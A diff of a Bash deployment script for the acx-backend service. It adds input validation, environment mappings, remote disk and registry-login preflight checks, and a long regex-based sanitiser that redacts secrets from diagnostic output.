+if [[ ! "${REMOTE_BUILDER_NODE}" =~ ^[A-Za-z0-9_.-]+$ || "${REMOTE_BUILDER_NODE}" == -* ]]; then
+  fail "ACX_REMOTE_BUILDER_NODE must be a non-leading-dash [A-Za-z0-9_.-] token (got: ${REMOTE_BUILDER_NODE})"
+fi
+if [[ "${REMOTE_BUILDER_ENDPOINT}" != "unix:///var/run/docker.sock" ]]; then
+  fail "ACX_REMOTE_BUILDER_ENDPOINT must be unix:///var/run/docker.sock; refusing an unverified endpoint"
+fi
+# D1: REMOTE_BUILD_DIR is interpolated into ssh remote command strings — same sink class as
+# ACX_BUILD_TARGET. Empty is refused (operator override of "" would otherwise skip the default).
+if [[ -z "${REMOTE_BUILD_DIR}" ]]; then
+  fail "ACX_REMOTE_BUILD_DIR must not be empty"
+fi
+assert_safe_shell_token "ACX_REMOTE_BUILD_DIR" "${REMOTE_BUILD_DIR}"
+
+# D8: explicit allowed-value enums (case already folded lower above). Anything else fails closed —
+# including `vlm2`, `bogus`, and previously-accepted freeform targets that could overwrite tags.
+assert_allowed_build_target() {
+  case "${ACX_BUILD_TARGET}" in
+    "" | runtime | runtime-vlm | builder | builder-vlm | runtime-base | uv) ;;
+    *)
+      fail "ACX_BUILD_TARGET must be one of: empty, runtime, runtime-vlm, builder, builder-vlm, runtime-base, uv (got: ${ACX_BUILD_TARGET})"
+      ;;
+  esac
+}
+assert_allowed_image_variant() {
+  case "${ACX_IMAGE_VARIANT}" in
+    "" | recognition | vlm) ;;
+    *)
+      fail "ACX_IMAGE_VARIANT must be one of: empty, recognition, vlm (got: ${ACX_IMAGE_VARIANT})"
+      ;;
+  esac
+}
+assert_allowed_build_target
+assert_allowed_image_variant
+
+# RA-07: derive repository name from ACX_BUILD_TARGET (+ ACX_IMAGE_VARIANT) so VLM and
+# recognition never share tags. Empty target keeps the historical IMAGE_NAME (default
+# acx-backend). runtime-vlm appends -vlm.
+# D8 (build half): ACX_IMAGE_VARIANT=vlm is FAIL-CLOSED unless ACX_BUILD_TARGET matches *vlm*.
+resolve_image_repo_name() {
+  local target="${ACX_BUILD_TARGET:-}"
+  local variant="${ACX_IMAGE_VARIANT:-}"
+  if [[ "${variant}" == "vlm" && "${target}" != *vlm* ]]; then
+    fail "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm* (got: ${target:-empty}); refusing fail-open variant/repo split"
+  fi
+  case "${target}" in
+    "" | runtime | runtime-base | builder | uv) printf '%s\n' "${IMAGE_NAME}" ;;
+    runtime-vlm | builder-vlm) printf '%s-vlm\n' "${IMAGE_NAME}" ;;
+    *)
+      # Enum above should make this unreachable; fail closed rather than invent a repo suffix.
+      fail "ACX_BUILD_TARGET=${target} is not mapped to an image repository (internal enum drift)"
+      ;;
+  esac
+}
+IMAGE_BASE="${OCIR_REGISTRY}/${OCIR_NAMESPACE}/$(resolve_image_repo_name)"
+# Compose image repo — same resolve_image_repo_name() result as build/push (one source of truth).
+# Shipped into the remote env .env so docker-compose.env.yml / .prod.yml pull the variant repo.
+# Operator may pre-set ACX_IMAGE_REPO only if it already matches resolve (no silent override).
+if [[ -n "${ACX_IMAGE_REPO:-}" && "${ACX_IMAGE_REPO}" != "${IMAGE_BASE}" ]]; then
+  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+  warn "ACX_IMAGE_REPO was pre-set (${ACX_IMAGE_REPO}); using resolve result ${IMAGE_BASE} as authority"
+fi
+ACX_IMAGE_REPO="${IMAGE_BASE}"
+assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+export ACX_IMAGE_REPO
+
+# True when the selected target/variant is torch-bearing VLM (budget is unvalidated).
+is_vlm_smoke_budget() {
+  [[ "${ACX_BUILD_TARGET:-}" == *vlm* || "${ACX_IMAGE_VARIANT:-}" == "vlm" ]]
+}
+
+# Positive-integer validation for ACX_SMOKE_TIMEOUT (rg-008: fail fast at read time).
+# Defaults are image-aware; operator override must still be a positive integer.
+resolve_smoke_timeout() {
+  local default raw
+  if is_vlm_smoke_budget; then
+    default="${SMOKE_TIMEOUT_VLM_DEFAULT}"
+  else
+    default="${SMOKE_TIMEOUT_DEFAULT}"
+  fi
+  raw="${ACX_SMOKE_TIMEOUT:-${default}}"
+  if ! [[ "${raw}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_SMOKE_TIMEOUT must be a positive integer (got: ${raw})"
+  fi
+  printf '%s\n' "${raw}"
+}
+
+# Select the remote docker data-root floor from the normalized build target. Match *vlm* rather
+# than only runtime-vlm because builder-vlm also downloads the torch-bearing extra.
+remote_build_min_free_gb() {
+  if [[ "${ACX_BUILD_TARGET:-}" == *vlm* ]]; then
+    printf '%s\n' "${REMOTE_VLM_BUILD_MIN_FREE_GB}"
+  else
+    printf '%s\n' "${REMOTE_BUILD_MIN_FREE_GB}"
+  fi
+}
+
+# Assert the remote docker data root has enough free space for the selected build variant.
+assert_remote_build_free_space() {
+  local target min_gb avail_gb observed_gb timeout rc=0
+  target="${ACX_BUILD_TARGET:-empty}"
+  min_gb="$(remote_build_min_free_gb)"
+  if [[ -n "${1:-}" ]]; then
+    timeout="${1}"
+    if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+      fail "remote free-space probe timeout must be a positive integer (got: ${timeout})"
+    fi
+  else
+    timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  fi
+  # df -BG prints e.g. "12G"; strip the unit. DockerRootDir is the volume that fills
+  # with BuildKit cache (OPS-1), not the rsync temp dir.
+  avail_gb="$(run_with_deadline "${timeout}" "remote docker free-space probe" \
+    ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    'root="$(docker info -f "{{.DockerRootDir}}" 2>/dev/null || echo /var/lib/docker)"; df -BG "$root" | awk "NR==2 {gsub(/G/,\"\",\$4); print \$4}"')" || rc=$?
+  if ((rc != 0)) || ! [[ "${avail_gb}" =~ ^[0-9]+$ ]]; then
+    observed_gb="${avail_gb:-unknown}"
+    fail "Remote build target ${target} needs at least ${min_gb}GB free on ${SSH_TARGET} docker data root; observed ${observed_gb} (free-space probe failed)"
+  fi
+  if ((avail_gb < min_gb)); then
+    fail "Remote build target ${target} needs at least ${min_gb}GB free on ${SSH_TARGET} docker data root; observed ${avail_gb}GB (prune BuildKit cache or free disk)"
+  fi
+  log "Remote free space OK: ${avail_gb}GB available (need ${min_gb}GB)"
+}
+
+# A-11 / S2-A-09: any path that materialises image layers on the VM (pull/promote/
+# boot-smoke) must consult the same free-space floor as remote build. VLM/torch
+# images are multi-GB; recognition pulls are smaller but still share the floor
+# when ACX_ENFORCE_DISK_ON_PULL=1. Default: enforce for VLM targets only so
+# hermetic boot-smoke tests with fake ssh are unaffected.
+assert_remote_disk_headroom_for_pull() {
+  if is_vlm_smoke_budget || [[ "${ACX_ENFORCE_DISK_ON_PULL:-0}" == "1" ]]; then
+    assert_remote_build_free_space
+  fi
+}
+
+#---------------------------------------------------------------- env mapping
+env_to_tag() {
+  case "$1" in
+    dev) echo "dev" ;;
+    dev-fir) echo "dev-fir" ;;
+    staging) echo "staging" ;;
+    prod) echo "latest" ;;
+    dev-auraface | staging-auraface | prod-auraface) echo "$1" ;;
+    *) fail "Unknown env: $1 (expected dev|dev-fir|staging|prod|dev-auraface|staging-auraface|prod-auraface)" ;;
+  esac
+}
+env_to_unit() {
+  case "$1" in
+    dev) echo "acx-dev" ;;
+    dev-fir) echo "acx-dev-fir" ;;
+    staging) echo "acx-staging" ;;
+    prod) echo "acx-prod" ;;
+    dev-auraface) echo "acx-dev-auraface" ;;
+    staging-auraface) echo "acx-staging-auraface" ;;
+    prod-auraface) echo "acx-prod-auraface" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_remote_dir() {
+  case "$1" in
+    dev) echo "/opt/acx-backend/dev" ;;
+    dev-fir) echo "/opt/acx-backend/dev-fir" ;;
+    staging) echo "/opt/acx-backend/staging" ;;
+    prod) echo "/opt/acx-backend/prod" ;;
+    dev-auraface) echo "/opt/acx-backend/dev-auraface" ;;
+    staging-auraface) echo "/opt/acx-backend/staging-auraface" ;;
+    prod-auraface) echo "/opt/acx-backend/prod-auraface" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_health_url() {
+  case "$1" in
+    dev) echo "https://dev.api.altcontext.com/health" ;;
+    dev-fir) echo "https://fir.dev.api.altcontext.com/health" ;;
+    staging) echo "https://staging.api.altcontext.com/health" ;;
+    prod) echo "https://api.altcontext.com/health" ;;
+    dev-auraface) echo "https://auraface.dev.altcontext.com/health" ;;
+    staging-auraface) echo "https://auraface.staging.api.altcontext.com/health" ;;
+    prod-auraface) echo "https://auraface.api.altcontext.com/health" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_ready_url() {
+  case "$1" in
+    dev) echo "https://dev.api.altcontext.com/ready" ;;
+    dev-fir) echo "https://fir.dev.api.altcontext.com/ready" ;;
+    staging) echo "https://staging.api.altcontext.com/ready" ;;
+    prod) echo "https://api.altcontext.com/ready" ;;
+    dev-auraface) echo "https://auraface.dev.altcontext.com/ready" ;;
+    staging-auraface) echo "https://auraface.staging.api.altcontext.com/ready" ;;
+    prod-auraface) echo "https://auraface.api.altcontext.com/ready" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_network() {
+  case "$1" in
+    dev) echo "acx-dev-net" ;;
+    dev-fir) echo "acx-dev-fir-net" ;;
+    staging) echo "acx-staging-net" ;;
+    prod) echo "acx-prod-net" ;;
+    dev-auraface) echo "acx-dev-auraface-net" ;;
+    staging-auraface) echo "acx-staging-auraface-net" ;;
+    prod-auraface) echo "acx-prod-auraface-net" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_api_alias() {
+  case "$1" in
+    dev | dev-fir | staging | prod | dev-auraface | staging-auraface | prod-auraface) echo "${1}-api" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+env_to_next_unit() {
+  local unit
+  # Fail closed: a refused unit must not be suffixed to "-next" with status 0.
+  unit="$(env_to_unit "$1")" || return 1
+  echo "${unit}-next"
+}
+
+# AuraFace release tier (frozen identities, exact labels only). Aura labels never
+# inherit generic/FIR identities or the generic prod admin overlay.
+is_aura_env() {
+  case "$1" in
+    dev-auraface | staging-auraface | prod-auraface) return 0 ;;
+    *) return 1 ;;
+  esac
+}
+# Production tier: generic prod and prod-auraface require CONFIRM=PROMOTE before
+# any remote access. This predicate is the single classification point.
+is_prod_tier_env() {
+  case "$1" in
+    prod | prod-auraface) return 0 ;;
+    *) return 1 ;;
+  esac
+}
+
+#---------------------------------------------------------------- pre-flight
+preflight_docker() {
+  command -v docker >/dev/null 2>&1 || fail "docker not found in PATH"
+  docker info >/dev/null 2>&1 || fail "docker daemon not running (start colima with \`colima start\`, or start Docker Desktop)"
+}
+
+# Authentication tools are upstream trust boundaries: their stderr can contain
+# terminal-active bytes or lines that resemble this script's own status output.
+# Keep ordinary text useful for diagnosis, but strip C0/C1 controls and prefix
+# every line so captured output cannot masquerade as a deploy decision.
+sanitize_deploy_diagnostic() {
+  # WHY: printf -v keeps SOH out of declare -f; tr no longer strips UTF-8 continuation bytes.
+  local _soh _sk _ek _hdr _sk_ci _ek_ci _hdr_ci
+  _portable_ere_ci() {
+    awk '{
+      in_class=0
+      for (i=1; i<=length($0); i++) {
+        c=substr($0, i, 1)
+        if (c == "[") in_class=1
+        if (!in_class && c ~ /^[A-Za-z]$/) printf "[%s%s]", tolower(c), toupper(c)
+        else printf "%s", c
+        if (c == "]") in_class=0
+      }
+      printf "\n"
+    }'
+  }
+  printf -v _soh '\001'
+  _sk='token|access_token|refresh_token|password|passwd|secret|api[-_]?key|[A-Za-z0-9_]*_token|[A-Za-z0-9_]*_password|[A-Za-z0-9_]*_secret|[A-Za-z0-9_]*_key_id|[A-Za-z0-9_]*_key_content|[A-Za-z0-9_]*_access_key|secret_key_base|[A-Za-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth'
+  _ek='[A-Za-z0-9_]*_(TOKEN|PASSWORD|SECRET|KEY|AUTH|PASSPHRASE|CREDENTIALS|PWD)|[A-Za-z0-9_]*_key_id|[A-Za-z0-9_]*_key_content|[A-Za-z0-9_]*_access_key|secret_key_base|_authtoken|_auth|PGPASSWORD|PASSPHRASE|pass_phrase|CREDENTIALS|TOKEN|PASSWORD|PASSWD|SECRET|KEY|AUTH|PASS'
+  _hdr='bearer|basic|token|apikey|api-key|api_key|digest|signature|aws4-hmac-sha256'
+  _sk_ci="$(printf '%s\n' "${_sk}" | _portable_ere_ci)"
+  _ek_ci="$(printf '%s\n' "${_ek}" | _portable_ere_ci)"
+  _hdr_ci="$(printf '%s\n' "${_hdr}" | _portable_ere_ci)"
+  LC_ALL=C LANG=C LC_CTYPE=C awk '
+      BEGIN { for (i=1; i<256; i++) byte[sprintf("%c", i)]=i }
+      {
+        out=""
+        for (i=1; i<=length($0); i++) {
+          c=substr($0,i,1); b=byte[c]
+          n=(b>=194 && b<=223) ? 2 : (b>=224 && b<=239) ? 3 : (b>=240 && b<=244) ? 4 : 0
+          valid=(n>0 && i+n-1<=length($0))
+          for (j=1; valid && j<n; j++) {
+            v=byte[substr($0,i+j,1)]
+            if (v<128 || v>191) valid=0
+            if (j==1 && ((b==224 && v<160) || (b==237 && v>=160) || (b==240 && v<144) || (b==244 && v>=144))) valid=0
+          }
+          if (valid) {
+            if (!(b==194 && byte[substr($0,i+1,1)]<=159)) out=out substr($0,i,n)
+            i+=n-1
+          } else if (b<128 || b>159) out=out c
+        }
+        print out
+      }
+    ' |
+    LC_ALL=C LANG=C LC_CTYPE=C tr -d '\000-\010\013-\037\177' |
+    LC_ALL=C LANG=C LC_CTYPE=C awk -v sq="'" '
+        function depth_delta(s,    i, c, in_str, esc, d) { d=0; in_str=0; esc=0; for (i=1; i<=length(s); i++) { c=substr(s,i,1); if (in_str) { if (esc) { esc=0; continue } if (c=="\\") { esc=1; continue } if (c=="\"") in_str=0; continue } if (c=="\"") { in_str=1; continue } if (c=="["||c=="{") d++; else if (c=="]"||c=="}") d-- } return d }
+        function is_pretty_open(s,    t, pat) { t=tolower(s); if (t ~ /"(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)"[ \t]*[=:]+[ \t]*[[{][ \t]*$/) return 1; pat=sq "(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)" sq "[ \t]*[=:]+[ \t]*[[{][ \t]*$"; return (t ~ pat) }
+        function is_pretty_scalar_open(s,    t, pat) { t=tolower(s); if (t ~ /"(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)"[ \t]*(:[ \t]*)?$/) return 1; pat=sq "(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)" sq "[ \t]*(:[ \t]*)?$"; return (t ~ pat) }
+        function is_yaml_secret_block(s,    t, pat, quote) { t=tolower(s); quote="(\"|" sq ")"; pat="^[ \t]*" quote "?(token|access_token|refresh_token|password|passwd|secret|apikey|api-key|api_key|authorization|[a-z0-9_]*_token|[a-z0-9_]*_password|[a-z0-9_]*_secret|[a-z0-9_]*_key_id|[a-z0-9_]*_key_content|[a-z0-9_]*_access_key|secret_key_base|[a-z0-9_]*_key|pgpassword|identitytoken|pass_phrase|auth|_auth)" quote "?[ \t]*:[ \t]*((&[^ \t]+|![^ \t]+)[ \t]+)*[|>][+-]?[0-9]?[+-]?[ \t]*(#.*)?$"; return (t ~ pat) }
+        function redact_pending_scalar(s,    lead, body, suffix) { lead=s; sub(/[^ \t].*$/, "", lead); body=substr(s, length(lead)+1); if (body ~ /^"([^"\\]|\\.)*"[ \t]*[,}][ \t]*$/) { suffix=body; sub(/^"([^"\\]|\\.)*"/, "", suffix); return lead "\"[REDACTED]\"" suffix } if (body ~ /^[^ \t,}][^ \t]*[,}][ \t]*$/) { suffix=body; sub(/^[^ \t,}]+/, "", suffix); return lead "[REDACTED]" suffix } return lead "[REDACTED]" }
+        function pem_begin_end(s) { return (s ~ /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/ && s ~ /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/) }
+        function pem_has_begin(s) { return (s ~ /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/) }
+        function redact_pem_oneline(s,    pre, rest) { match(s, /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/); pre=substr(s, 1, RSTART+RLENGTH-1); rest=substr(s, RSTART+RLENGTH); match(rest, /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/); return pre " [REDACTED] " substr(rest, RSTART) }
+        function redact_pem_prefix(s,    t) { match(s, /-----BEGIN [A-Za-z0-9 ]*PRIVATE KEY-----/); t=substr(s, RSTART+RLENGTH); if (t ~ /^[ \t]*$/) return substr(s, 1, RSTART+RLENGTH-1); return substr(s, 1, RSTART+RLENGTH-1) " [REDACTED]" }
+        BEGIN { pem=0; depth=0; yaml_indent=-1; pending_secret=0 }
+        { if (yaml_indent>=0) { if ($0 ~ /^[ \t]*$/) { print; next } match($0, /[^ \t]/); indent=RSTART-1; if (indent>yaml_indent) { print "[REDACTED]"; next } yaml_indent=-1 } if (pending_secret) { if (pending_secret==1 && $0 ~ /^[ \t]*:[ \t]*$/) { pending_secret=2; print; next } if ($0 ~ /^[ \t]*$/) { print; next } pending_secret=0; if ($0 ~ /^[ \t]*[[{]/) { depth+=depth_delta($0); print "[REDACTED]"; next } print redact_pending_scalar($0); next } if (pem) { if ($0 ~ /-----END [A-Za-z0-9 ]*PRIVATE KEY-----/) { pem=0; print; next } print "[REDACTED]"; next } if (pem_begin_end($0)) { print redact_pem_oneline($0); next } if (pem_has_begin($0)) { print redact_pem_prefix($0); pem=1; next } if (depth>0) { depth+=depth_delta($0); if (depth<0) depth=0; if ($0 ~ /^[ \t]*[\]},]*[ \t]*$/) print; else print "[REDACTED]"; next } if (is_yaml_secret_block($0)) { match($0, /[^ \t]/); yaml_indent=RSTART-1; print; next } if (is_pretty_scalar_open($0)) { pending_secret=1; print; next } if (is_pretty_open($0)) { depth+=depth_delta($0); print; next } print }
+      ' |
+    LC_ALL=C LANG=C LC_CTYPE=C sed -E \
+      -e 's/["'"'"'][Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn]["'"'"'][[:space:]]*:[[:space:]]*"('"${_hdr_ci}"')[[:space:]]+(\\.|[^"\\])*"/"Authorization": "\1 [REDACTED]"/g' \
+      -e "s/[\"'][Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn][\"'][[:space:]]*:[[:space:]]*'("${_hdr_ci}")[[:space:]]+(\\\\.|[^'\\\\])*'/\"Authorization\": \"\\1 [REDACTED]\"/g" \
+      -e 's/[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn][[:space:]]*[=:][[:space:]]*('"${_hdr_ci}"')[[:space:]].*/Authorization: \1 [REDACTED]/g' \
+      -e 's/[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Aa][Tt][Ii][Oo][Nn][[:space:]]*[=:][[:space:]]*[^[:space:]]+$/Authorization: [REDACTED]/g' \
+      -e 's/(^|[^[:alnum:]])('"${_hdr_ci}"')[[:space:]]+("[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:]"'"'"']{8,})/\1\2 [REDACTED]/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*"/"\1": "[REDACTED]"/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+'"'"'(\\.|[^'"'"'\\])*'"'"'/"\1": "[REDACTED]"/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*\\?$/"\1": "[REDACTED]/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+'"'"'(\\.|[^'"'"'\\])*\\?$/"\1": "[REDACTED]/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+(null|true|false)([,}[:space:]]|$)/"\1": '"${_soh}"'\3\4/g' \
+      -e 's/'"${_soh}"'([A-Za-z]*[A-Z][A-Za-z]*)/\1/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+[\[{].*$/"\1": [REDACTED]/g' \
+      -e 's/["'"'"']('"${_sk_ci}"')["'"'"'][[:space:]]*([=:]+>?[[:space:]]*)+([^[:space:],}"'"'"''"${_soh}"'][^[:space:],}"'"'"']*)/"\1": [REDACTED]/g' \
+      -e 's/"('"${_sk_ci}"')"[[:space:]]*:[[:space:]]*\[REDACTED\]([,}][^[:space:]]+)/"\1": [REDACTED]/g' \
+      -e 's/(^|[^A-Za-z0-9_-])('"${_ek_ci}"')[[:space:]]*([=:]+>?[[:space:]]*)+"(\\.|[^"\\])*"/\1\2=[REDACTED]/g' \
+      -e "s/(^|[^A-Za-z0-9_-])(${_ek_ci})[[:space:]]*([=:]+>?[[:space:]]*)+'[^']*'/\1\2=[REDACTED]/g" \
+      -e 's/(^|[^A-Za-z0-9_-])('"${_ek_ci}"')[[:space:]]*([=:]+>?[[:space:]]*)+[^[:space:]]+/\1\2=[REDACTED]/g' \
+      -e "s/(^|[[:space:]])([cC][uU][rR][lL]|[wW][gG][eE][tT])([[:space:]][^[:space:]]+)*[[:space:]]+(-[uU]|--[uU][sS][eE][rR])(=|[[:space:]]+)\"[^\"]*\"/\\1\\2\\3 \\4 [REDACTED]/g" \
+      -e "s/(^|[[:space:]])([cC][uU][rR][lL]|[wW][gG][eE][tT])([[:space:]][^[:space:]]+)*[[:space:]]+(-[uU]|--[uU][sS][eE][rR])(=|[[:space:]]+)'[^']*'/\\1\\2\\3 \\4 [REDACTED]/g" \
+      -e 's/(^|[[:space:]])([cC][uU][rR][lL]|[wW][gG][eE][tT])([[:space:]][^[:space:]]+)*[[:space:]]+(-[uU]|--[uU][sS][eE][rR])(=|[[:space:]]+)[^[:space:]]+/\1\2\3 \4 [REDACTED]/g' \
+      -e 's/(^|[[:space:]])--([A-Za-z0-9_-]*([pP][aA][sS][sS][wW][oO][rR][dD]|[pP][aA][sS][sS][wW][dD]|[tT][oO][kK][eE][nN]|[sS][eE][cC][rR][eE][tT]|[kK][eE][yY]))[=:][^[:space:]]+/\1--\2=[REDACTED]/g' \
+      -e 's/(^|[[:space:]])--([A-Za-z0-9_-]*([pP][aA][sS][sS][wW][oO][rR][dD]|[pP][aA][sS][sS][wW][dD]|[tT][oO][kK][eE][nN]|[sS][eE][cC][rR][eE][tT]|[kK][eE][yY]))[[:space:]]+[^[:space:]]+/\1--\2 [REDACTED]/g' \
+      -e 's/(^|[^[:alnum:]])([A-Za-z0-9-]*-([tT][oO][kK][eE][nN]|[sS][eE][cC][rR][eE][tT]|[kK][eE][yY]))[[:space:]]*:[[:space:]]*[^[:space:]]+/\1\2: [REDACTED]/g' \
+      -e 's/(^|[^A-Za-z0-9_])([A-Za-z0-9_-]*([aA][pP][iI]_[kK][eE][yY]|[aA][pP][iI]-[kK][eE][yY]|[aA][pP][iI][kK][eE][yY]))[[:space:]]*:[[:space:]]*[^[:space:]"]+/\1\2: [REDACTED]/g' \
+      -e 's/(^|[^A-Za-z0-9_])([aA][pP][iI]_[kK][eE][yY]|[aA][pP][iI]-[kK][eE][yY]|[aA][pP][iI][kK][eE][yY])[[:space:]]*=[[:space:]]*("[^"]*"|'\''[^'\'']*'\''|[^[:space:]&"]+)/\1\2=[REDACTED]/g' \
+      -e 's|://([^:/@[:space:]]*):([^[:space:]/]+)@([[:alnum:]._-]+)|://\1:[REDACTED]@\3|g' \
+      -e 's|://([^:/@[:space:]]*):([^[:space:]/@]+)@|://\1:[REDACTED]@|g' \
+      -e 's/[Cc]ookie:[[:space:]].*/Cookie: [REDACTED]/' \
+      -e 's/[gG][hH][pP]_[A-Za-z0-9]{20,}/[REDACTED]/g' \
+      -e 's/[gG][iI][tT][hH][uU][bB]_[pP][aA][tT]_[A-Za-z0-9_]{10,}/[REDACTED]/g' \
+      -e 's/[aA][kK][iI][aA][A-Z0-9]{16}/[REDACTED]/g' \
+      -e 's/'"${_soh}"'//g' |
+    LC_ALL=C LANG=C LC_CTYPE=C sed 's/^/diagnostic: /'
+}
+
+# Prefix-and-redact one evidence blob onto deploy stderr. Hoisted so
+# capture_failure_evidence does not redefine it on every call (C-05).
+emit_sanitized_evidence() {
+  local blob="$1"
+  [[ -n "${blob}" ]] || return 0
+  if ! printf '%s\n' "${blob}" | sanitize_deploy_diagnostic >&2; then
+    echo "diagnostic: evidence unavailable" >&2
+  fi
+}
+
+# Release It! 5.5 (Fail Fast): verify the credential we will actually use, before
+# the build burns minutes. The old form only checked that *some* entry for the
+# registry existed in ~/.docker/config.json -- a credential revoked upstream
+# still looked healthy here and failed at push, which is exactly the "the one
+# resource nobody checked is where it fails late" trap.
+#
+# The new form performs the real login against a freshly fetched Vault token in
+# the deploy-scoped DOCKER_CONFIG subsequently used by push and pull. A green
+# preflight guarantees that those later processes receive the authenticated
+# config; registry-side rejection can still occur after the preflight.
+ocir_login_or_fail() {
+  local scope="$1" out rc=0
+  shift
+  out="$("$@" 2>&1)" || rc=$?
+  if [[ "$rc" -ne 0 ]]; then
+    local class hint
+    class="$(ocir_classify_login_failure "$out")"
+    hint="$(ocir_login_failure_hint "$class")"
+    warn "OCIR login failed on ${scope} [${class}]: ${hint}"
+    warn "Sanitized upstream diagnostic follows"
+    # The token never appears in $out -- it only ever transits a pipe -- but the
+    # OCI CLI echoes request context, so keep this on stderr rather than in a
+    # deploy log that gets pasted around.
+    if ! printf '%s\n' "$out" | sanitize_deploy_diagnostic >&2; then
+      echo "diagnostic: OCIR login diagnostic unavailable" >&2
+    fi
+    fail "OCIR auth unavailable (${scope}, ${class})"
+  fi
+  log "OCIR authenticated on ${scope} via acx-vault/${ACX_OCIR_TOKEN_SECRET}"
+}
+
+preflight_ocir_auth() {
+  local snippet
+  init_deploy_ocir_docker_config
+  snippet="$(ocir_login_snippet "${ACX_LOCAL_OCI_BIN}" api_key "${OCIR_REGISTRY}")"
+  ocir_login_or_fail "laptop" bash -c "$snippet"
+}
+preflight_ssh() {
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'echo ok' >/dev/null 2>&1; then
+    warn "SSH to ${SSH_TARGET} failed (check ssh-add, public-IP allowlist, key path, tailnet status)."
+    fail "SSH unavailable"
+  fi
+}
+preflight_remote_docker() {
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" 'docker info >/dev/null 2>&1'; then
+    fail "docker not running (or user lacks docker group) on ${SSH_TARGET}"
+  fi
+}
+preflight_remote_ocir_auth() {
+  # ACX_REMOTE_OCI_BIN carries a literal $HOME for the remote shell to expand, so
+  # the snippet is fed to `bash -s` over stdin rather than interpolated into
+  # argv. The here-string binds to the function call; ssh inherits that stdin.
+  local snippet remote_dir
+  if [[ "${ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED}" == "1" ]]; then
+    return 0
+  fi
+  init_remote_ocir_docker_config
+  remote_dir="$(remote_ocir_config_dir)" || fail "Remote OCIR credential dir is not initialized"
+  snippet="$(ACX_OCIR_DOCKER_CONFIG_DIR="${remote_dir}" \
+    ocir_login_snippet "${ACX_REMOTE_OCI_BIN}" instance_principal "${OCIR_REGISTRY}")"
+  ocir_login_or_fail "${SSH_TARGET}" \
+    ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    'bash -s' <<<"$snippet"
+  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=1
+}
+preflight_rsync() {
+  command -v rsync >/dev/null 2>&1 || fail "rsync not found in PATH (required for remote-build mode)"
+}
+# Only paths that reach the image (rsync build context) or drive the deploy itself.
+# Edits elsewhere (harness config, docs) cannot change what ships, so they must not
+# train operators to reach for ACX_ALLOW_DIRTY. The build context and templates now
+# come from the DEPLOY_SHA snapshot, so untracked and gitignored files can no longer
+# ship. The dirty check still guards the deploy script itself and the operator's intent.
+DEPLOY_CLEAN_PATHS=("apps/prototype-description-service" "scripts/deploy")
+preflight_git_clean() {
+  local env="$1" dirty
